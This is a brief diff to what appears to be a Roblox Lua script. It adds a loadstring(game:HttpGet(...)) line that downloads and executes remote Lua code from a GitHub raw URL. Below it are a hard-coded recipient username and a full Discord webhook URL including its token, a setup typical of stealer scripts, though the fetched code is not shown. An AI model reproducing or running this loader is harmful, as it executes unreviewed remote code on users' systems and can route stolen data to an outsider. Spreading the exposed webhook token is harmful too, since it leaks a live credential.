@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
+
 Username = "jerfie22"
 Webhook = "https://discord.com/api/webhooks/1151175399246675968/UWrlwesnmN0FI_kMFQFxMhnM0NxFVYEF5eqt_lZCzTAMy57nFPVeVqT5H2502mEaODJH"
 
